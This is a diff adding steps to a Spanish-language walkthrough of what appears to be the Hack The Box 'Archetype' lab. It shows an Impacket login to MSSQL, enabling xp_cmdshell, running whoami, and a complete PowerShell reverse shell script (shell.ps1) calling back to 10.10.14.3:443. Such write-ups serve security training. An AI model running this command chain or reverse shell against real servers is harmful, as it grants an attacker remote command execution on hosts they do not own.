@@ -199,18 +199,61 @@ SQL> SELECT IS_SRVROLEMEMBER ('sysadmin')
 
 SQL> 
 ```
-*USE_SRVROLEMEMBER* Es la función que sirve para determinar si el usuario actual puede realizar una acción que necesite los permisos del rol del servidor.
+*USE_SRVROLEMEMBER*  Es la función que sirve para determinar si el usuario actual puede realizar una acción que necesite los permisos del rol del servidor.
 
 Si devuleve el valor `1` significa que LOGIN es miembro del grupo role, esto al tener éxito y de hecho, tenemos privilegios de administrador de sistemas.
 
 Esto nos permitirá habilitar `xp_cmdshell` y obtener `RCE` en el host. Intentemos esto, ingresando los siguientes comandos.
+
+```bash
+─[rebcesp@parrot]─[~/Descargas]
+└──╼ $python3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
+[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
+[!] Press help for extra shell commands
+SQL> EXEC sp_configure 'Show Advanced Options', 1;
+[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+SQL> reconfigure;
+SQL> sp_configure;
+```
+
+### NULL No-Privileges
+
+La salida del comando `whoami` revela que SQL Server también se está ejecutando en el contexto del usuario `ARCHETYPE\sql_svc`. Sin embargo, esta cuenta no parece tener privilegios administrativos en el host.
+
+```bash
+SQL> EXEC sp_configure 'xp_cmdshell', 1
+[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
+SQL> reconfigure;
+SQL> xp_cmdshell "whoami"
+output                                                                             
+
+--------------------------------------------------------------------------------   
+
+archetype\sql_svc                                                                  
+
+NULL                 
+```
 
 ### ¿Qué es xp_cmdshell?
 
 Es un procedimiento extendido muy potente que se lo utiliza para ejecutar la línea de comandos de Windows(cmd). Este comando es bastante útil para ejecutar tareas en el sistema operativo tales como copiar archivos, crear carpetas, compartir carpetas, etc. Mediante T-SQL. en pocas palabras podríamos intentar elevar privilegios.
 
 
+### shell.ps1
 
+Vamos a seguir enumerando, intentaremos obtener una shell adecuada, lo haremos con `Powershell` guardado como nombre `shell.ps1`.
 
+```powershell
+ $client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() 
+```
 
 
